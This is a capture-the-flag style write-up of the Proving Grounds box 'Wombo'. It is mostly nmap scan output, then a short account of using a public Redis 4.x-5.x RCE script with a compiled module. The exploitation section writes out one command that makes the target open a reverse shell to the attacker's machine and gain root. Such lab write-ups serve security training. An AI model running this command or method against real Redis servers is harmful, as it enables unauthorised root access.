---
Alias: Wombo
Date: {{date}}
Platform: Linux
Category:
Difficulty: Easy
Tags: #redis-rce.py
Status: Finished
IP: 192.168.192.69
---

# {{Wombo}}


# Resolution summary
- Per nmap scan I found Redis key-value store 5.0.9 running 
- Found redis 4x-5x RCE exploit
- Followed the steps to exploit redis and received a root shell


## Improved skills


## Used tools
- nmap
- rustscan
- redis

---

# Information Gathering
Scanned all TCP ports:
```bash
rustscan -a 192.168.192.69 --ulimit 5000                                                                    (master✱) 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.192.69:22
Open 192.168.192.69:80
Open 192.168.192.69:6379
Open 192.168.192.69:8080
Open 192.168.192.69:27017
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 13:34 EDT
Initiating Ping Scan at 13:34
Scanning 192.168.192.69 [2 ports]
Completed Ping Scan at 13:34, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:34
Completed Parallel DNS resolution of 1 host. at 13:34, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:34
Scanning 192.168.192.69 [5 ports]
Discovered open port 8080/tcp on 192.168.192.69
Discovered open port 80/tcp on 192.168.192.69
Discovered open port 22/tcp on 192.168.192.69
Discovered open port 27017/tcp on 192.168.192.69
Discovered open port 6379/tcp on 192.168.192.69
Completed Connect Scan at 13:34, 0.08s elapsed (5 total ports)
Nmap scan report for 192.168.192.69
Host is up, received syn-ack (0.10s latency).
Scanned at 2022-05-30 13:34:51 EDT for 0s

PORT      STATE SERVICE    REASON
22/tcp    open  ssh        syn-ack
80/tcp    open  http       syn-ack
6379/tcp  open  redis      syn-ack
8080/tcp  open  http-proxy syn-ack
27017/tcp open  mongod     syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds


# Nmap 7.92 scan initiated Mon May 30 13:29:18 2022 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /home/kali/Downloads/ProvingGroundsBoxes/Wombo/results/192.168.192.69/scans/_full_tcp_nmap.txt -oX /home/kali/Downloads/ProvingGroundsBoxes/Wombo/results/192.168.192.69/scans/xml/_full_tcp_nmap.xml 192.168.192.69
Nmap scan report for 192.168.192.69
Host is up, received user-set (0.15s latency).
Scanned at 2022-05-30 13:29:32 EDT for 1009s
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE  SERVICE    REASON         VERSION
22/tcp    open   ssh        syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 09:80:39:ef:3f:61:a8:d9:e6:fb:04:94:23:c9:ef:a8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGBXRhQCez7/IOdnHzLYdpVtWWRMN/7bUR/C3T/W6V9DwlKUS2AfdncLdLwqnx61jODFdXDrTdEdTAtK4MHuXt/UOLDXr1SOfUHYQbZd1rmpMaeB3qOKfoVP7NMp2Ga68kT/9NvBphakYXRWw4C7RS0N+4YWU/BjSyMTIdnhJX05lC5Uyljg7FliJ7d3J/CtF98I6Oo5u/Eb2/5BB45/1IuM6R7BGCDOpIs6po1FyEk8gFktbB+INGATdBPxvmAOX6G7m/R491a9/QtaF8wrgsjS3fQftoiW8vwcaom8Bmu94xZ9pZq0Dgt9VWQz241T5dGQrp57s6Djl/V83/qGFP
|   256 1e:2b:13:30:5c:f1:31:15:b4:e8:f3:d2:c4:e8:05:b5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPS81xs7EU6k92rNFdmsDF7qcRDxDILJUeva18aKW1GV
53/tcp    closed domain     reset ttl 63
80/tcp    open   http       syn-ack ttl 63 nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Welcome to nginx!
| http-methods: 
|_  Supported Methods: HEAD
6379/tcp  open   redis      syn-ack ttl 63 Redis key-value store 5.0.9
8080/tcp  open   http-proxy syn-ack ttl 63
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     set-cookie: _csrf=LjJwGOSTPixmGMajDhaq4BsV; Path=/
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 11098
|     ETag: W/"2b5a-o8uHyL8wXjsclafFmgVkQ2vN054"
|     Vary: Accept-Encoding
|     Date: Mon, 30 May 2022 17:39:37 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en-GB" data-dir="ltr" style="direction: ltr;" >
|     <head>
|     <title>Not Found | NodeBB</title>
|     <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1.0" />
|     <meta name="content-type" content="text/html; charset=UTF-8" />
|     <meta name="apple-mobile-web-app-capable" content="yes" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta property="og:site_n
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     set-cookie: _csrf=0rW-I8S_ZynL7xyqKyvk-ibd; Path=/
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 18181
|     ETag: W/"4705-uul0l6CCS5W/sVjZaVG893gtlCo"
|     Vary: Accept-Encoding
|     Date: Mon, 30 May 2022 17:39:36 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en-GB" data-dir="ltr" style="direction: ltr;" >
|     <head>
|     <title>Home | NodeBB</title>
|     <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1.0" />
|     <meta name="content-type" content="text/html; charset=UTF-8" />
|     <meta name="apple-mobile-web-app-capable" content="yes" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta property="og:site_name" content
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     Allow: GET,HEAD
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8
|     ETag: W/"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg"
|     Vary: Accept-Encoding
|     Date: Mon, 30 May 2022 17:39:36 GMT
|     Connection: close
|     GET,HEAD
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
|_http-favicon: Unknown favicon MD5: 152FF7D5AE5BDB84B33D4DCA31EB7CD3
| http-methods: 
|_  Supported Methods: HEAD OPTIONS
27017/tcp open   mongodb    syn-ack ttl 63 MongoDB 4.0.18
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, OfficeScan, apple-iphoto, docker, hazelcast-http, metasploit-msgrpc: 
|     HTTP/1.0 200 OK
|     Connection: close
|     Content-Type: text/plain
|     Content-Length: 85
|     looks like you are trying to access MongoDB over HTTP on the native driver port.
|   mongodb: 
|     errmsg
|     command serverStatus requires authentication
|     code
|     codeName
|_    Unauthorized
| mongodb-databases: 
|   code = 13
|   codeName = Unauthorized
|   errmsg = command listDatabases requires authentication
|_  ok = 0.0
| mongodb-info: 
|   MongoDB Build info
|     maxBsonObjectSize = 16777216
|     javascriptEngine = mozjs
|     storageEngines
|       1 = ephemeralForTest
|       2 = mmapv1
|       3 = wiredTiger
|       0 = devnull
|     version = 4.0.18
|     sysInfo = deprecated
|     ok = 1.0
|     allocator = tcmalloc
|     buildEnvironment
|       distarch = x86_64
|       target_arch = x86_64
|       distmod = debian92
|       linkflags = -pthread -Wl,-z,now -rdynamic -Wl,--fatal-warnings -fstack-protector-strong -fuse-ld=gold -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro
|       cxx = /opt/mongodbtoolchain/v2/bin/g++: g++ (GCC) 5.4.0
|       cxxflags = -Woverloaded-virtual -Wno-maybe-uninitialized -std=c++14
|       target_os = linux
|       cc = /opt/mongodbtoolchain/v2/bin/gcc: gcc (GCC) 5.4.0
|       ccflags = -fno-omit-frame-pointer -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -Werror -O2 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -Wno-missing-braces -fstack-protector-strong -fno-builtin-memcmp
|     gitVersion = 6883bdfb8b8cff32176b1fd176df04da9165fd67
|     debug = false
|     openssl
|       compiled = OpenSSL 1.1.0l  10 Sep 2019
|       running = OpenSSL 1.1.0l  10 Sep 2019
|     bits = 64
|     modules
|     versionArray
|       1 = 0
|       2 = 18
|       3 = 0
|       0 = 4
|   Server status
|     code = 13
|     codeName = Unauthorized
|     errmsg = command serverStatus requires authentication
|_    ok = 0.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=9%D=5/30%Time=62950157%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,3494,"HTTP/1\.1\x20200\x20OK\r\nX-DNS-Prefetch-Control:\x20off
SF:\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Download-Options:\x20noopen\r\n
SF:X-Content-Type-Options:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=b
SF:lock\r\nReferrer-Policy:\x20strict-origin-when-cross-origin\r\nX-Powere
SF:d-By:\x20NodeBB\r\nset-cookie:\x20_csrf=0rW-I8S_ZynL7xyqKyvk-ibd;\x20Pa
SF:th=/\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x2018181\r\nETag:\x20W/\"4705-uul0l6CCS5W/sVjZaVG893gtlCo\"\r\nVary:\x
SF:20Accept-Encoding\r\nDate:\x20Mon,\x2030\x20May\x202022\x2017:39:36\x20
SF:GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\r\n<html\x20lang=
SF:\"en-GB\"\x20data-dir=\"ltr\"\x20style=\"direction:\x20ltr;\"\x20\x20>\
SF:r\n<head>\r\n\t<title>Home\x20\|\x20NodeBB</title>\r\n\t<meta\x20name=\
SF:"viewport\"\x20content=\"width&#x3D;device-width,\x20initial-scale&#x3D
SF:;1\.0\"\x20/>\n\t<meta\x20name=\"content-type\"\x20content=\"text/html;
SF:\x20charset=UTF-8\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-app-capab
SF:le\"\x20content=\"yes\"\x20/>\n\t<meta\x20name=\"mobile-web-app-capable
SF:\"\x20content=\"yes\"\x20/>\n\t<meta\x20property=\"og:site_name\"\x20co
SF:ntent")%r(HTTPOptions,1BF,"HTTP/1\.1\x20200\x20OK\r\nX-DNS-Prefetch-Con
SF:trol:\x20off\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Download-Options:\x
SF:20noopen\r\nX-Content-Type-Options:\x20nosniff\r\nX-XSS-Protection:\x20
SF:1;\x20mode=block\r\nReferrer-Policy:\x20strict-origin-when-cross-origin
SF:\r\nX-Powered-By:\x20NodeBB\r\nAllow:\x20GET,HEAD\r\nContent-Type:\x20t
SF:ext/html;\x20charset=utf-8\r\nContent-Length:\x208\r\nETag:\x20W/\"8-ZR
SF:Af8oNBS3Bjb/SU2GYZCmbtmXg\"\r\nVary:\x20Accept-Encoding\r\nDate:\x20Mon
SF:,\x2030\x20May\x202022\x2017:39:36\x20GMT\r\nConnection:\x20close\r\n\r
SF:\nGET,HEAD")%r(RTSPRequest,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:nnection:\x20close\r\n\r\n")%r(FourOhFourRequest,2D42,"HTTP/1\.1\x20404
SF:\x20Not\x20Found\r\nX-DNS-Prefetch-Control:\x20off\r\nX-Frame-Options:\
SF:x20SAMEORIGIN\r\nX-Download-Options:\x20noopen\r\nX-Content-Type-Option
SF:s:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nReferrer-Poli
SF:cy:\x20strict-origin-when-cross-origin\r\nX-Powered-By:\x20NodeBB\r\nse
SF:t-cookie:\x20_csrf=LjJwGOSTPixmGMajDhaq4BsV;\x20Path=/\r\nContent-Type:
SF:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2011098\r\nETag:\x2
SF:0W/\"2b5a-o8uHyL8wXjsclafFmgVkQ2vN054\"\r\nVary:\x20Accept-Encoding\r\n
SF:Date:\x20Mon,\x2030\x20May\x202022\x2017:39:37\x20GMT\r\nConnection:\x2
SF:0close\r\n\r\n<!DOCTYPE\x20html>\r\n<html\x20lang=\"en-GB\"\x20data-dir
SF:=\"ltr\"\x20style=\"direction:\x20ltr;\"\x20\x20>\r\n<head>\r\n\t<title
SF:>Not\x20Found\x20\|\x20NodeBB</title>\r\n\t<meta\x20name=\"viewport\"\x
SF:20content=\"width&#x3D;device-width,\x20initial-scale&#x3D;1\.0\"\x20/>
SF:\n\t<meta\x20name=\"content-type\"\x20content=\"text/html;\x20charset=U
SF:TF-8\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-app-capable\"\x20conte
SF:nt=\"yes\"\x20/>\n\t<meta\x20name=\"mobile-web-app-capable\"\x20content
SF:=\"yes\"\x20/>\n\t<meta\x20property=\"og:site_n");
Device type: firewall
Running: Fortinet embedded
OS CPE: cpe:/h:fortinet:fortigate_100d
OS details: Fortinet FortiGate 100D firewall
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=5/30%OT=22%CT=53%CU=%PV=Y%DS=2%DC=T%G=N%TM=629502ED%P=
OS:x86_64-pc-linux-gnu)ECN(R=N)T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R
OS:=N)T3(R=N)T4(R=N)T5(R=N)T6(R=N)T7(R=N)U1(R=N)IE(R=N)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   406.00 ms 192.168.49.1
2   406.00 ms 192.168.192.69

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 30 13:46:21 2022 -- 1 IP address (1 host up) scanned in 1034.03 seconds
```

Enumerated open TCP ports:
```bash
6379
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 6379 - Redis

#### - Googled "redis key-value store 5.0.9 exploit github" and found the following link/web page showing the following redis rce exploit:

![](Images/Pasted%20image%2020221111102950.png)
![](Images/Pasted%20image%2020221111103142.png)

---

# Exploitation
## Redis 4x-5x RCE Exploit

#### -Downloaded the exploit on my kali machine 

#### -Downloaded the following exploit on my kali machine and compiled the "exp.so" and placed in the directory of the previous exploit I found:

![](Images/Pasted%20image%2020221111103254.png)

![](Images/Pasted%20image%2020221111103350.png)

#### -Typed "python3 redis-rce.py -r 192.168.192.69 -L 192.168.49.192 -P 8080 -f exp.so" and chose the reverse shell option

#### - Started a penelope listener on port 80 

#### -Hit enter on the exploit and received a reverse shell as root:

![](Images/Pasted%20image%2020221111103924.png)
![](../Images/Pasted%20image%2020220531122846.png)
---



